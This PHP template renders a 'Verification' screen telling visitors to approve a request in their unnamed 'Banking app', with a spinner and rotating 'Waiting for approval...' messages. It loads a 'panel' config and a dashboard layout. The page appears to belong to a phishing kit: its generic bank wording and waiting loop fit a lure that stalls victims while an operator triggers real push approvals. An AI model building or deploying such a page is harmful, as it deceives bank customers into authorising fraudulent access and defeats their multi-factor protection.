<?php
require_once 'config/panel.php';
$title = "Verification";
ob_start();
?>

<div style="min-height:100vh;" class="w-100 d-flex flex-column justify-content-center align-items-center bg-dark text-center p-4">

    <div class="card shadow-lg rounded-4 bg-black text-white p-4" style="max-width:420px; width:100%;">

        <!-- Custom Phone Illustration -->
        <div class="d-flex justify-content-center mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="90" height="90" fill="none" viewBox="0 0 24 24" 
                 stroke="red" stroke-width="1.5" class="phone-icon">
                <rect x="6" y="2" width="12" height="20" rx="2" ry="2" fill="#111" stroke="red"/>
                <circle cx="12" cy="18" r="1.5" fill="red"/>
            </svg>
        </div>

        <!-- Title -->
        <h2 class="mb-3">Verification</h2>
        <p style="color:#b3b3b3; font-size:14px;">
            For your security, please approve the request in your Banking app.
        </p>

        <!-- Spinner -->
        <div class="d-flex flex-column align-items-center my-4">
            <div class="spinner-border text-danger mb-3" style="width:3rem; height:3rem;" role="status">
                <span class="visually-hidden">Loading...</span>
            </div>
            <p id="statusText" style="color:#b3b3b3; font-size:14px;">
                Waiting for approval...
            </p>
        </div>

        <!-- Info Row -->
        <div class="d-flex justify-content-around mt-3" style="font-size:13px; color:#999;">
            <div class="d-flex flex-column align-items-center">
                <i class="bi bi-shield-check text-success mb-1"></i>
                <span>Secure</span>
            </div>
            <div class="d-flex flex-column align-items-center">
                <i class="bi bi-clock-history text-warning mb-1"></i>
                <span>Real-time</span>
            </div>
        </div>
    </div>

</div>

<!-- Scripts -->
<script>
    // Rotate status messages
    const messages = [
        "Waiting for approval...",
        "Checking your app...",
        "Almost there, please wait..."
    ];
    let i = 0;
    setInterval(() => {
        document.getElementById("statusText").innerText = messages[i % messages.length];
        i++;
    }, 4000);
</script>

<!-- Styles -->
<style>
.phone-icon {
    animation: pulse 2s infinite;
}
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.8; }
    100% { transform: scale(1); opacity: 1; }
}
</style>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php'; ?>